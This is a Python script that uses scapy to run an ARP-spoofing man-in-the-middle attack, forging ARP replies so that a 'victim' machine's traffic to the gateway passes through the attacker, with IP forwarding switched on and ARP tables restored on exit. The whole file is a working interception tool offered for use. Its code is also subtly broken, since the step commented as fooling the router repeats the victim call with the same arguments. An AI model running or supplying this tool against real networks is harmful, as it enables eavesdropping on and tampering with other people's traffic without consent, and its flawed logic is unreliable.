#!/usr/bin/env python3
import scapy.all as scapy
import re
import argparse
import os
import sys
import time


def CheckSudo():
    if os.getuid() != 0:
        print("\nProgram must be run with root privileges!!")
        sys.exit(1)

def CreateParser():
    parser = argparse.ArgumentParser()
    parser.add_argument("-v", "--victim", dest="victim", help="Victim's IP Address")
    parser.add_argument("-g", "--gateway", dest="default_gateway", help="Router's IP Address")
    return parser.parse_args()

def IsIp(ip):
    #Returns True if ip is a valid IP address
    if re.search("^(\d{1,3}\.){3}\d{1,3}$", ip):
        return True
    else: return False

def ValidateArguments(options):
    if options.victim and IsIp(options.victim):
        victim = options.victim
    else:
        print("[-] Specify a valid IP for the victim! Use -h for more information.")
        sys.exit(1)
    if options.default_gateway and IsIp(options.default_gateway):
        spoof = options.default_gateway
    else:
        print("[-] Specify a valid IP for the the default gateway! Use -h for more information.")
        sys.exit(1)
    return victim, spoof

def Fool(victim_ip, spoof_ip):
    #Create a packet to the victim, that comes from the spoof ip, but with your actual mac. After that, the victim links your mac to the router ip, then everything will be sent to you
    packet = scapy.ARP(op=2,pdst=victim_ip, hwdst=GetMac(victim_ip), psrc=spoof_ip)
    scapy.send(packet, verbose=False)

def GetMac(ip):
    ARP_packet = scapy.ARP(pdst = ip)
    broadcast = scapy.Ether(dst = "ff:ff:ff:ff:ff:ff")
    packet = broadcast/ARP_packet
    answered = scapy.srp(packet, timeout=1, verbose=False)[0]
    return answered[0][1].hwsrc

def Restore(victim_ip, spoof_ip):
    packet = scapy.ARP(op=2,pdst=victim_ip, hwdst=GetMac(victim_ip), psrc=spoof_ip, hwsrc=GetMac(spoof_ip))
    scapy.send(packet, verbose=False)
    packet = scapy.ARP(op=2,pdst=spoof_ip, hwdst=GetMac(spoof_ip), psrc=victim_ip, hwsrc=GetMac(victim_ip))
    scapy.send(packet, verbose=False)


# ----------------------------MAIN----------------------------------
try:
    CheckSudo()
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
    options = CreateParser()

    #Parse arguments
    victim_ip, spoof_ip = ValidateArguments(options)

    print("[+] Intercepting packets between " + victim_ip + " and " + spoof_ip + " ...")
    #We need to continuosly send packets to fool both victims
    packets_sent = 2
    while True:
        #Make the victim think you are the router
        Fool(victim_ip, spoof_ip)
        #Make the router think you are the victim
        Fool(victim_ip, spoof_ip)
        print(f"\r[+] Packets sent: {packets_sent}", end="")
        packets_sent+=2
        time.sleep(2)

except KeyboardInterrupt:
    print('\n[-] CTRL+C detected. Restoring victims ARP tables and exiting...')
    Restore(victim_ip, spoof_ip)
    sys.exit(0)
